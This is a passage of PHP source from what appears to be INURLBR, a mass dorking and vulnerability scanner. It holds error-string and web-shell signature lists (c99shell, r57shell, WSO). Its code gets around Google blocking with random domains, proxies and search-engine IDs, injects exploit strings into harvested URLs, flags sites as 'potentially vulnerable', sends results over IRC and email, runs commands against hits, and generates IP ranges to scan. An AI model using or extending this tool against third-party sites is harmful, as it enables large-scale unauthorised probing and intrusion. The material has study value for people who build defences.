        $validation['ORACLE-09'] = 'SQL command not properly ended';

        /* #[*]ERROR DB2
         * DB2 is a database system Relational Manager (SGDBR) produced by IBM. 
         * There are different versions of DB2 running from a simple PDA | 
         * handheld, even in powerful mainframes and run on servers based on 
         * Unix, Windows, or Linux.
         * http://www-01.ibm.com/software/br/db2/lowerdatabasecosts/
         * https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#DB2_Escaping */
        $validation['DB2-01'] = 'DB2 ODBC';
        $validation['DB2-02'] = 'DB2 error';
        $validation['DB2-03'] = 'DB2 Driver';

        /* #[*]ERROR ODBC
         * ODBC (acronym for Open Database Connectivity) is a standard for 
         * access to managers of database systems (DBMS).
         * https://support.office.com/pt-br/article/Administrar-fontes-de-dados-ODBC-b19f856b-5b9b-48c9-8b93-07484bfab5a7
         * https://www.exploit-db.com/papers/12975/ */
        $validation['ODBC-01'] = 'ODBC SQL';
        $validation['ODBC-02'] = 'ODBC DB2';
        $validation['ODBC-03'] = 'ODBC Driver';
        $validation['ODBC-04'] = 'ODBC Error';
        $validation['ODBC-05'] = 'ODBC Microsoft Access';
        $validation['ODBC-06'] = 'ODBC Oracle';
        $validation['ODBC-07'] = 'ODBC Microsoft Access Driver';

        /* #[*]ERROR POSTGRESQL
         * PostgreSQL is an object-relational database management system 
         * (ORDBMS), developed as an open source project.
         * http://www.postgresql.org.br/old/
         * https://www.owasp.org/index.php/OWASP_Backend_Security_Project_Testing_PostgreSQL */
        $validation['POSTGRESQL-01'] = 'Warning: pg_';
        $validation['POSTGRESQL-02'] = 'PostgreSql Error:';
        $validation['POSTGRESQL-03'] = 'function.pg';
        $validation['POSTGRESQL-04'] = 'Supplied argument is not a valid PostgreSQL result';
        $validation['POSTGRESQL-05'] = 'PostgreSQL query failed: ERROR: parser: parse error';
        $validation['POSTGRESQL-06'] = 'pg_';

        /* #[*]ERROR SYBASE
         * Sybase (NYSE: SY), an SAP company, is a software company that 
         * produces services and products related to information management, 
         * mobility, messaging, development tools, and data warehousing and 
         * OLAP data.
         * https://www.owasp.org/index.php?search=SYBASE&title=Special%3ASearch&go=Go */
        $validation['SYBASE-01'] = 'Warning: sybase_';
        $validation['SYBASE-02'] = 'function.sybase';
        $validation['SYBASE-03'] = 'Sybase result index';
        $validation['SYBASE-04'] = 'Sybase Error:';
        $validation['SYBASE-05'] = 'Sybase: Server message:';
        $validation['SYBASE-06'] = 'sybase_';
        $validation['SYBASE-07'] = '[Sybase][ODBC Driver]:';

        /* #[*]ERROR JBOSSWEB 
         * JBoss Web Server is an enterprise ready web server designed for 
         * medium and large applications, based on Tomcat. 
         * JBoss Web a component of the JBoss Application Server, there are 
         * no more standalone version of JBoss Web you need the Application 
         * Server to get the Servlet/JSP container.
         * http://jbossweb.jboss.org/
         * http://www.rapid7.com/db/search?utf8=%E2%9C%93&q=JBoss+&t=a */
        $validation['JBOSSWEB-01'] = 'java.sql.SQLSyntaxErrorException: ORA-';
        $validation['JBOSSWEB-02'] = 'org.springframework.jdbc.BadSqlGrammarException:';
        $validation['JBOSSWEB-03'] = 'javax.servlet.ServletException:';
        $validation['JBOSSWEB-04'] = 'java.lang.NullPointerException';

        /* #[*]ERROR JDBC
         * Java Database Connectivity or JDBC is a set of classes and 
         * interfaces (API) written in Java that make sending SQL statements 
         * for any relational database
         * http://www.oracle.com/technetwork/java/javase/jdbc/index.html
         * https://www.owasp.org/index.php/Preventing_SQL_Injection_in_Java */
        $validation['JDBC_CFM-01'] = 'Error Executing Database Query';
        $validation['JDBC_CFM-02'] = 'SQLServer JDBC Driver';
        $validation['JDBC_CFM-03'] = 'JDBC SQL';
        $validation['JDBC_CFM-04'] = 'JDBC Oracle';
        $validation['JDBC_CFM-05'] = 'JDBC MySQL';
        $validation['JDBC_CFM-06'] = 'JDBC error';
        $validation['JDBC_CFM-07'] = 'JDBC Driver';

        /* #[*]JAVA INFINITYDB
         * InfinityDB is an all-Java embedded database engine that is deployed 
         * in handheld devices, on servers, on workstations, and in distributed 
         * settings. */
        $validation['JAVA-INFINITYDB-01'] = 'java.io.IOException: InfinityDB';

        /* #[*]ERROR PHP 
         * The PHP development team announces the immediate availability of 
         * PHP 5.4.40. 14 security-related bugs were fixed in this release, 
         * including CVE-2014-9709, CVE-2015-2301, CVE-2015-2783, CVE-2015-1352. 
         * All PHP 5.4 users are encouraged to upgrade to this version.
         * http://php.net/ */
        $validation['ERRORPHP-01'] = 'Warning: include';
        $validation['ERRORPHP-02'] = 'Fatal error: include';
        $validation['ERRORPHP-03'] = 'Warning: require';
        $validation['ERRORPHP-04'] = 'Fatal error: require';
        $validation['ERRORPHP-05'] = 'ADODB_Exception';
        $validation['ERRORPHP-06'] = 'Warning: include(';
        $validation['ERRORPHP-07'] = 'Warning: require_once(';
        $validation['ERRORPHP-08'] = 'function.include';
        $validation['ERRORPHP-09'] = 'Disallowed Parent Path';
        $validation['ERRORPHP-10'] = 'function.require';
        $validation['ERRORPHP-11'] = 'Warning: main(';
        $validation['ERRORPHP-12'] = 'Warning: session_start()';
        $validation['ERRORPHP-13'] = 'Warning: getimagesize()';
        $validation['ERRORPHP-16'] = 'Warning: array_merge()';
        $validation['ERRORPHP-17'] = 'Warning: preg_match()';
        $validation['ERRORPHP-18'] = 'GetArray()';
        $validation['ERRORPHP-19'] = 'FetchRow()';
        $validation['ERRORPHP-20'] = 'Warning: preg_';
        $validation['ERRORPHP-21'] = 'Warning: ociexecute()';
        $validation['ERRORPHP-22'] = 'Warning: ocifetchstatement()';
        $validation['ERRORPHP-23'] = 'PHP Warning:';

        /* #[*]ERROR ASP
         * The ASP (Active Server Pages), also known as Classic ASP today, is a
         * framework of basic libraries (and not a language) for processing of
         * scripting languages on the server side to generate dynamic content on
         * the Web
         * http://www.asp.net/ */
        $validation['ERRORASP-01'] = 'Version Information: Microsoft .NET Framework';
        $validation['ERRORASP-04'] = 'ASP.NET is configured to show verbose error messages';
        $validation['ERRORASP-05'] = 'BOF or EOF';
        $validation['ERRORASP-06'] = 'Unclosed quotation mark';
        $validation['ERRORASP-06'] = 'Error converting data type varchar to numeric';

        /* #[*]ERROR LUA 
         * Lua is a scripting language imperative, procedural, small, reflective
         * and light, designed to expand applications in general, to be an 
         * extensible language (which connects parts of a program made in more 
         * than one language)
         * http://www.lua.org/ */
        $validation['ERRORLUA-01'] = 'LuaPlayer ERROR:';
        $validation['ERRORLUA-02'] = 'CGILua message';
        $validation['ERRORLUA-03'] = 'Lua error';

        #[*]ERROR INDEFINIDOS
        $validation['INDEFINITE-01'] = 'Incorrect syntax near';
        $validation['INDEFINITE-02'] = 'Fatal error';
        $validation['INDEFINITE-04'] = 'Invalid Querystring';
        $validation['INDEFINITE-05'] = 'Input string was not in a correct format';
        $validation['INDEFINITE-06'] = 'An illegal character has been found in the statement';

        #[*]SHELL SCRIPT backdoored.
        $validation['SHELL-01'] = 'c99shell</title>';
        $validation['SHELL-02'] = 'C99Shell v';
        $validation['SHELL-03'] = '<form method="POST" action="cfexec.cfm">';
        $validation['SHELL-05'] = '<input type=text name=".CMD" size=45 value=';
        $validation['SHELL-05'] = '<title>awen asp.net webshell</title>';
        $validation['SHELL-06'] = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>";
        $validation['SHELL-07'] = 'JSP Backdoor Reverse Shell';
        $validation['SHELL-08'] = 'Simple CGI backdoor by DK';
        $validation['SHELL-09'] = 'execute command: <input type="text" name="c">';
        $validation['SHELL-10'] = 'Execute Shell Command';
        $validation['SHELL-11'] = 'r57shell</title>';
        $validation['SHELL-12'] = '<title>r57Shell';
        $validation['SHELL-13'] = 'heroes1412';
        $validation['SHELL-14'] = 'MyShell';
        $validation['SHELL-15'] = 'PHP Shell';
        $validation['SHELL-16'] = 'PHPShell';
        $validation['SHELL-17'] = 'REMVIEW TOOLS';
        $validation['SHELL-18'] = '<title>iTSecTeam</title>';
        $validation['SHELL-19'] = 'JSP Backdoor Reverse Shell';
        $validation['SHELL-20'] = '<title>*  ernealizm  * </title>';
        $validation['SHELL-21'] = '<title>JSP Shell</title>';
        $validation['SHELL-22'] = '<title>KNULL Shell</title>';
        $validation['SHELL-23'] = '<title>.+- WSO.+</title>';
        $validation['SHELL-24'] = '<title>SST Sheller !</title>';
        $validation['SHELL-25'] = '<title>SyRiAn Sh3ll';
        $validation['SHELL-26'] = '<title>Mini Php Shell';
        $validation['SHELL-27'] = '<title>ASPX Shell</title>';
        $validation['SHELL-28'] = '<title>ZoRBaCK Connect</title>';
        $validation['SHELL-29'] = '<title>.+Ani-Shell.+</title>';
        $validation['SHELL-30'] = '<title>Stored Procedure Execute</title>';
        $validation['SHELL-31'] = '<title>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::</title>';
        $validation['SHELL-32'] = '<title>PhpShell 2.0</title>';
        $validation['SHELL-33'] = '<title>.+NTDaddy.+</title>';
        $validation['SHELL-34'] = '<title>PHP-Terminal';

        $_SESSION['config']['cms-check-resultado'] = (!is_null($_SESSION['config']['cms-check'])) ? __SimpleCheckCMS($html_) : NULL;
    }

    if (!is_null($_SESSION['config']['regexp'])) {

        preg_match_all("#\b{$_SESSION['config']['regexp']}#i", $html_, $match);
        __plus();
        return (isset($match[0][0]) && !empty($match[0][0]) ? " regular expression->{$_SESSION['config']['regexp']} - " . $match[0][0] . " FOUD! " : NULL);
    } else {

        foreach ($validation as $campo => $valor) {

            __plus();
            if (__validateBD($html_, $validation[$campo], $campo)) {

                __plus();
                return(" {$campo}  -  VALUE: {$validation[$campo]}");
            }
        }
    }
}

################################################################################
#CHECK ERROR 2 HTML INSIDE######################################################
################################################################################

function __validateBD($html_, $verificar, $bd) {

    return (strstr($html_, $verificar)) ? $bd : NULL;
}

################################################################################
#FORMAT URL#####################################################################
################################################################################

function __mountURLExploit($_url) {

    $_url = explode("=", trim(urldecode($_url)));
    $get = max(array_keys($_url));
    $get_ = $_url[$get];
    return implode("=", str_replace($get_, $get_ . ((!is_null($_SESSION['config']['exploit-get'])) ? $_SESSION['config']['exploit-get'] : NULL), $_url));
}

################################################################################
#FILTER HTML URLs ALL THE RETURN OF seekers#####################################
################################################################################

function __filterURL($html, $op = NULL) {

    $reg = !strstr($op, 'GOOGLE') ? "#\b(href=\"|src=\"|value=\")(.*?)(\")#si" :
            "#\b(href=\"|src=\"|value=\"http[s]?://|href=\"|src=\"|value=\"ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
    $html = str_replace('href="/url?q=', 'href="', $html);

    if (strstr($html, '.google.com/sorry/IndexRedirect?continue=https://www.google.com.') && $_SESSION['config']['persist'] <= $_SESSION["config"]['google_attempt'][1]) {

        print_r("{$_SESSION["c1"]}[ INFO ][ ERROR ]{$_SESSION["c2"]} GOOGLE LOCKED!{$_SESSION["c0"]}\n");
        $randHost = __dominioGoogleRandom();
        $_SESSION["config"]['google_attempt'][1] ++;
        __pageEngine($_SESSION["config"]["conf_array_tmp"], "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1", $_SESSION["config"]["dork_tmp"], NULL, 0, 0, 1);
    } else {
        $_SESSION["config"]["google_attempt"][1] = 0;
        preg_match_all($reg, $html, $html);
        return (array_filter(array_unique($html[0])));
    }
}

################################################################################
#FILTER HTML URLs ALL THE RETURN OF GOOGLE API##################################
################################################################################

function __filterURLJson($html) {

    $html = json_decode($html, true);
    $allresponseresults = $html['responseData']['results'];
    foreach ($allresponseresults as $value) {
        $tmp[] = $value['url'];
    }
    return (array_filter(array_unique($tmp)));
}

################################################################################
#Filtering the repeated emails #################################################
################################################################################

function __filterEmailsRepeated() {

    echo "\n\n{$_SESSION["c1"]}|[ INFO ][ Filtering the repeated emails  the file {$_SESSION['config']['arquivo_output']} ]{$_SESSION["c0"]}\n";
    $array = __openFile($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output'], 1);
    if (is_array($array)) {

        unlink($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output']);
        unset($_SESSION['config']['resultado_valores']);
        foreach ($array as $value) {

            __saveValue($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output'], $value, 2) . __plus();
            $_SESSION['config']['resultado_valores'] .= "{$value}\n";
        }
    } else {

        echo "\n\n{$_SESSION["c1"]}|[ ERROR ][ ERROR EMAILS FILTERING ]{$_SESSION["c0"]}\n";
    }
}

################################################################################
#COUNTING PROCESS END URLS / vuln AND SHOWING THE URLS / vuln###################
################################################################################

function __exitProcess() {

    $file = !is_null($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
    $file_all = !is_null($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
    (($_SESSION['config']['extrai-email']) ? __filterEmailsRepeated() : NULL);
    $cont = count(explode("\n", $_SESSION['config']['resultado_valores'])) - 1;
    echo "\n\n{$_SESSION["c1"]}[ INFO ] [ Shutting down ]{$_SESSION["c0"]}";
    echo "\n{$_SESSION["c1"]}[ INFO ] [ End of process INURLBR at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c0"]}";
    echo "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]}{$_SESSION["c16"]}[ TOTAL FILTERED VALUES ]::{$_SESSION["c1"]} [ {$cont} ]{$_SESSION["c0"]}";
    echo!is_null($file) ? "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL;
    echo!is_null($file_all) ? "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL;
    echo "\n{$_SESSION["c1"]}|_________________________________________________________________________________________{$_SESSION["c0"]}\n";

    print_r(!$_SESSION['config']['extrai-email'] ? $_SESSION['config']['resultado_valores'] : NULL);

    echo "\n{$_SESSION["c1"]}\_________________________________________________________________________________________/{$_SESSION["c0"]}\n";
    __getOut("\n");
}

################################################################################
#CASE URLS FILTER AND VALIDATING URL VALID######################################
################################################################################

function __subProcess($resultado = NULL) {

    $resultado_ = is_array($resultado) ? array_unique(array_filter($resultado)) : $resultado;
    if (isset($resultado_)) {

        foreach ($resultado_ as $result) {

            $result = __filterURLTAG($result);
            $result_ = __validateURL($result) ? $result : NULL;
            $blacklist_ = (!is_null($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $_SESSION["config"]['blacklist']) : $_SESSION["config"]['blacklist'];
            __plus();

            if (not_isnull_empty($result_) && !__validateOptions($blacklist_, $result_, 1)) {

                $_SESSION["config"]["totas_urls"].= "{$result_}\n";
            }
        }
    }
}

################################################################################
#DEBUGAR VALORES E PROCESSOS####################################################
################################################################################

function __debug($valor, $op = NULL) {

    return isset($_SESSION["config"]["debug"]) && __validateOptions($_SESSION["config"]["debug"], $op) ? "\n[ INFO ][ FUNCTION ]=>{$valor['function']}[ DEBUG ] => \n" . print_r($valor['debug']) . "\n" : NULL;
}

################################################################################
#TIME TO PROCESS SEC############################################################
################################################################################

function __timeSec($camp, $value = NULL) {

    echo!is_null($_SESSION['config'][$camp]) && !empty($_SESSION['config'][$camp]) ? "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ TIME SEC/DELAY ]::{$_SESSION["c1"]}{ {$_SESSION["c8"]}[ {$_SESSION['config'][$camp]} ]{$_SESSION["c1"]} }{$_SESSION["c0"]}{$value}" : NULL;
    !is_null($_SESSION['config'][$camp]) ? sleep($_SESSION['config'][$camp]) : NULL;
}

################################################################################
#SEARCH ENGINE CONFIGURATION####################################################
################################################################################

function __pageEngine($confArray, $motorNome, $motorURL, $dork, $postDados, $pagStart, $pagLimit, $pagIncrement, $pagStart2 = NULL, $pagIncrement2 = NULL) {

    __plus();

    echo ("\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ ENGINE ]::{$_SESSION["c1"]}[ {$motorNome} ]{$_SESSION["c0"]}\n");
    echo (!is_null($_SESSION['config']['max_pag']) ? ("{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ LIMIT PAG ]::{$_SESSION["c1"]}[ {$_SESSION['config']['max_pag']} ]{$_SESSION["c0"]}\n") : NULL);
    $http_proxy = not_isnull_empty($_SESSION['config']['proxy-http-file']) || not_isnull_empty($_SESSION['config']['proxy-http']) ? __proxyHttpRandom() : NULL;
    echo not_isnull_empty($http_proxy) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ HTTP_PROXY ]:: {$http_proxy}{$_SESSION["c0"]}\n" : NULL;
    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c0"]}\n";

    $contMaxpg = 0;
    $pagStart2_ = $pagStart2;
    $pagStart3_ = $pagStart2;
    while ($pagStart <= $pagLimit) {

        echo "{$_SESSION["c1"]}-{$_SESSION["c16"]}[{$_SESSION["c12"]}:::{$_SESSION["c16"]}]{$_SESSION["c0"]}";
        __plus();
        $_proxy = not_isnull_empty($confArray["list_proxy_rand"]) && !not_isnull_empty($_SESSION['config']['time-proxy']) ? $confArray["list_proxy_rand"] : $_SESSION["config"]["proxy"];
        $proxy = not_isnull_empty($_SESSION['config']['proxy-file']) && not_isnull_empty($_SESSION['config']['time-proxy']) ? __timeSecChangeProxy($confArray["list_proxy_file"]) : $_proxy;

        $murl[0] = str_replace("[DORK]", $dork, $motorURL);
        $murl[0] = str_replace("[PAG]", $pagStart, $murl[0]);
        $murl[0] = str_replace("[PAG2]", $pagStart2_, $murl[0]);
        $murl[0] = str_replace("[PAG3]", $pagStart3_, $murl[0]);
        $murl[0] = str_replace("[RANDOM]", base64_encode(intval(rand() % 255) . intval(rand() % 2553333)), $murl[0]);
        $murl[0] = str_replace("[IP]", intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255), $murl[0]);


        $postDados = !is_null($postDados) ? __convertUrlQuery(parse_url(urldecode($murl[0]), PHP_URL_QUERY)) : NULL;

        __debug(array('debug' => "[ URL ENGINE ]{$http_proxy}{$murl[0]}", 'function' => '__pageEngine'), 1);

        $request__ = __request_info($http_proxy . $murl[0], $proxy, $postDados);
        __plus();
        $tmp_url = ($motorNome == 'GOOGLE API') ? __filterURLJson($request__["corpo"]) : __filterURL($request__["corpo"], $motorNome);
        __subProcess($tmp_url);
        __plus();

        $pagStart = ($pagStart + $pagIncrement);
        $pagStart2_ = ($pagStart2_ + $pagIncrement);
        $pagStart3_ = ($pagStart3_ + $pagIncrement2);
        $contMaxpg++;
        __timeSec('delay');

        if (!is_null($_SESSION['config']['max_pag']) && $_SESSION['config']['max_pag'] == $contMaxpg) {

            break;
        }
    }
}

################################################################################
#SUB PROCESS INJECT VALUES######################################################
################################################################################

function __subExecExploits($target, $exploitArray = array()) {

    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ SUB PROCESS ]::\n";
    $target = __filterHostname($target);

    foreach ($exploitArray as $value) {

        $postDados = !is_null($_SESSION["config"]["sub-post"]) ? __convertUrlQuery($value) : NULL;
        $patch_GP = (is_null($postDados) ? $value : NULL);
        $url = $target . $_SESSION["config"]["sub-concat"] . $patch_GP;

        echo "{$_SESSION["c7"]}-[||]{$_SESSION["c0"]}";
        $resultado__ = __request_info($url, $_SESSION["config"]["proxy"], $postDados);
        __plus();
        $ifcode = not_isnull_empty($_SESSION['config']['ifcode']) &&
                strstr($resultado__['server']['http_code'], $_SESSION['config']['ifcode']) ?
                "CODE_HTTP_FOUND: {$_SESSION['config']['ifcode']} / " : NULL;
        $ifredirect = (strstr($resultado__['server']['redirect_url'], $_SESSION['config']['ifredirect'])) ? $resultado__['server']['redirect_url'] : NULL;
        $_ex['erroReturn'] = $ifredirect . $ifcode . __checkError($resultado__['corpo']);

        __plus();
        $_ex['vull_style'] = (not_isnull_empty($_ex['erroReturn'])) ?
                "{$_SESSION["c15"]}[ INFO ][ {$_ex['erroReturn']} ]\n[ INFO ][ TARGET POTENTIALLY VULNERABLE ]: " . __cli_beep() : NULL;
        echo (not_isnull_empty($_ex['erroReturn']) ? "\n{$_ex['vull_style']}{$url}\n{$_SESSION["c0"]}" : NULL);
        echo (not_isnull_empty($_ex['erroReturn']) ? __saveValue($_SESSION['config']['arquivo_output'], $url, 1) . "\n" : NULL);
        __plus();
        $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_ex['erroReturn']) ? "{$url}\n" : NULL);
        (not_isnull_empty($_ex['erroReturn']) && not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ?
                        __ircMsg($_SESSION['config']['irc'], "{$_ex['erroReturn']}::: {$url}") : NULL);

        (not_isnull_empty($_ex['erroReturn']) && !is_null($_SESSION['config']['sub-cmd-vul']) ? __command($_SESSION['config']['sub-cmd-vul'], $url) : NULL);
        (not_isnull_empty($_SESSION['config']['sub-cmd-all']) ? __command($_SESSION['config']['sub-cmd-all'], $url) : NULL);
        __plus();
        __timeSec('delay');
    }
    unset($_ex);
}

################################################################################
#SEND VALUES EMAIL##############################################################
################################################################################
# (PHP 4, PHP 5) mail — Send mailhttp://php.net/manual/en/function.mail.php

function __sendMail($email, $value) {

    $headers = NULL;
    $headers .= "From: <scanner-inurlbr@localhost>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
    $headers .= "content-type: text/html\nX-priority: 1\n";
    $body = "------------------------------------------------------\n";
    $body.="DATE:  [" . date("d-m-Y H:i:s") . "]";
    $body.=not_isnull_empty($_SESSION['config']['http-header']) ? "HTTP HEADER: {$_SESSION['config']['http-header']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['motor']) ? "MOTOR BUSCA: {$_SESSION['config']['motor']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['tipoerro']) ? "TIPO ERROR: {$_SESSION['config']['tipoerro']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['exploit-get']) ? "EXPLOIT GET: {$_SESSION['config']['exploit-get']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['exploit-post']) ? "EXPLOIT-POST: {$_SESSION['config']['exploit-post']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['command-vul']) ? "COMMAND VUL: {$_SESSION['config']['command-vul']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['command-all']) ? "COMMAND ALL: {$_SESSION['config']['command-all']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['user-agent']) ? "USER AGENT: {$_SESSION['config']['user-agent']}\n" : NULL;
    $body.= "------------------------------------------------------\n";

    if (mail($email, "[ INFO ][ OUTPUT INURLBR ]:: {$value}", $body, $headers)) {
        __plus();
        return "[ INFO ][ SUBMITTED SUCCESSFULLY ]\n";
    } else {
        __plus();
        return "[ INFO ][ NOT SENT ]\n";
    }
}

################################################################################
#HOST GOOGLE RANDOM#############################################################
################################################################################

function __dominioGoogleRandom() {

    $_SESSION["random"]['dominio_google'] = array(
        'www.google.com', 'www.google.ac', 'www.google.com.om',
        'www.google.ad', 'www.google.ae', 'www.google.com.af',
        'www.google.com.ag', 'www.google.com.ai', 'www.google.am',
        'www.google.it.ao', 'www.google.com.ar', 'www.google.cat',
        'www.google.as', 'www.google.at', 'www.google.com.au',
        'www.google.az', 'www.google.ba', 'www.google.com.bd',
        'www.google.be', 'www.google.bf', 'www.google.bg',
        'www.google.com.bh', 'www.google.bi', 'www.google.bj',
        'www.google.com.bn', 'www.google.com.bo', 'www.google.com.br',
        'www.google.bs', 'www.google.co.bw', 'www.google.com.by',
        'www.google.com.bz', 'www.google.ca', 'www.google.com.kh',
        'www.google.cc', 'www.google.cd', 'www.google.cf',
        'www.google.cn', 'www.google.com.co', 'www.google.co.nz',
        'www.google.cg', 'www.google.ch', 'www.google.ci',
        'www.google.co.ck', 'www.google.cl', 'www.google.cm',
        'www.google.co.cr', 'www.google.com.cu', 'www.google.cv',
        'www.google.cz', 'www.google.de', 'www.google.nu',
        'www.google.dj', 'www.google.dk', 'www.google.dm',
        'www.google.com.do', 'www.google.dz', 'www.google.no',
        'www.google.com.ec', 'www.google.ee', 'www.google.com.eg',
        'www.google.es', 'www.google.com.et', 'www.google.com.np',
        'www.google.fi', 'www.google.com.fj', 'www.google.fm',
        'www.google.fr', 'www.google.ga', 'www.google.nl',
        'www.google.ge', 'www.google.gf', 'www.google.gg',
        'www.google.com.gh', 'www.google.com.gi', 'www.google.nr',
        'www.google.gl', 'www.google.gm', 'www.google.gp',
        'www.google.gr', 'www.google.com.gt', 'www.google.com.ni',
        'www.google.gy', 'www.google.com.hk', 'www.google.hn',
        'www.google.hr', 'www.google.ht', 'www.google.com.ng',
        'www.google.hu', 'www.google.co.id', 'www.google.iq',
        'www.google.ie', 'www.google.co.il', 'www.google.com.nf',
        'www.google.im', 'www.google.co.in', 'www.google.io',
        'www.google.is', 'www.google.it', 'www.google.ne',
        'www.google.je', 'www.google.com.jm', 'www.google.jo',
        'www.google.co.jp', 'www.google.co.ke', 'www.google.com.na',
        'www.google.ki', 'www.google.kg', 'www.google.co.kr',
        'www.google.com.kw', 'www.google.kz', 'www.google.co.mz',
        'www.google.la', 'www.google.com.lb', 'www.google.com.lc',
        'www.google.li', 'www.google.lk', 'www.google.com.my',
        'www.google.co.ls', 'www.google.lt', 'www.google.lu',
        'www.google.lv', 'www.google.com.ly', 'www.google.com.mx',
        'www.google.co.ma', 'www.google.md', 'www.google.me',
        'www.google.mg', 'www.google.mk', 'www.google.mw',
        'www.google.ml', 'www.google.mn', 'www.google.ms',
        'www.google.com.mt', 'www.google.mu', 'www.google.mv',
        'www.google.com.pa', 'www.google.com.pe', 'www.google.com.ph',
        'www.google.com.pk', 'www.google.pn', 'www.google.com.pr',
        'www.google.ps', 'www.google.pt', 'www.google.com.py',
        'www.google.com.qa', 'www.google.ro', 'www.google.rs',
        'www.google.ru', 'www.google.rw', 'www.google.com.sa',
        'www.google.com.sb', 'www.google.sc', 'www.google.se',
        'www.google.com.sg', 'www.google.sh', 'www.google.si',
        'www.google.sk', 'www.google.com.sl', 'www.google.sn',
        'www.google.sm', 'www.google.so', 'www.google.st',
        'www.google.com.sv', 'www.google.td', 'www.google.tg',
        'www.google.co.th', 'www.google.tk', 'www.google.tl',
        'www.google.tm', 'www.google.to', 'www.google.com.tn',
        'www.google.com.tr', 'www.google.tt', 'www.google.com.tw',
        'www.google.co.tz', 'www.google.com.ua', 'www.google.co.ug',
        'www.google.co.uk', 'www.google.us', 'www.google.com.uy',
        'www.google.co.uz', 'www.google.com.vc', 'www.google.co.ve',
        'www.google.vg', 'www.google.co.vi', 'www.google.com.vn',
        'www.google.vu', 'www.google.ws', 'www.google.co.za',
        'www.google.co.zm', 'www.google.co.zw'
    );

    return $_SESSION["random"]['dominio_google'][rand(0, count($_SESSION["random"]['dominio_google']) - 1)];
}

################################################################################
#(CSE)-GOOGLE Custom Search Engine ID RANDOM####################################
################################################################################

function __googleGenericRandom() {

    $generic = array(
        '013269018370076798483:wdba3dlnxqm',
        '005911257635119896548:iiolgmwf2se',
        '007843865286850066037:b0heuatvay8',
        '002901626849897788481:cpnctza84gq',
        '006748068166572874491:55ez0c3j3ey',
        '012984904789461885316:oy3-mu17hxk',
        '006688160405527839966:yhpefuwybre',
        '003917828085772992913:gmoeray5sa8',
        '007843865286850066037:3ajwn2jlweq',
        '010479943387663786936:wjwf2xkhfmq',
        '012873187529719969291:yexdhbzntue',
        '012347377894689429761:wgkj5jn9ee4'
    );
    return $generic[rand(0, count($generic) - 1)];
}

################################################################################
#PROXY HTTP BASE FILE###########################################################
################################################################################

function __proxyHttpRandom() {

    $proxy_file = (file_exists($_SESSION['config']['proxy-http-file']) ? __openFile($_SESSION['config']['proxy-http-file'], 1) : array());
    $proxy_ = is_array($proxy_file) ? array_merge($_SESSION['config']['proxy-http'], $proxy_file) : $_SESSION['config']['proxy-http'];

    return $proxy_[rand(0, count($proxy_) - 1)];
}

################################################################################
#FILTER UNIQUE DOMAIN###########################################################
################################################################################

function __filterDomainUnique($resultados) {

    if (is_array($resultados)) {

        foreach ($resultados as $value) {

            $temp[] = "http://" . __filterHostname($value);
        }

        return array_unique(array_filter($temp));
    }

    return FALSE;
}

################################################################################
#FILTER IF URL DOMAIN###########################################################
################################################################################

function __filterURLif($resultados) {

    if (is_array($resultados)) {

        foreach ($resultados as $value) {

            $temp[] = not_isnull_empty($_SESSION['config']['ifurl']) && strstr($value, $_SESSION['config']['ifurl']) ? $value : NULL;
        }

        return array_unique(array_filter($temp));
    }

    return FALSE;
}

################################################################################
#GENERATOR RANGE IP#############################################################
################################################################################

function __generatorRangeIP($range) {

    $ip_ = explode(',', $range);
    if (is_array($ip_)) {

        $_ = array(0 => ip2long($ip_[0]), 1 => ip2long($ip_[1]));
        while ($_[0] <= $_[1]) {

            $ips[] = "http://" . long2ip($_[0]);
            $_[0] ++;
        }
    } else {

        return FALSE;
    }

    return $ips;
}

################################################################################
#GENERATOR RANGE IP RANDOM######################################################
################################################################################

function __generatorIPRandom($cont) {

    $cont[0] = 0;
    while ($cont[0] < $cont[1]) {

        $bloc[0] = rand(0, 255);
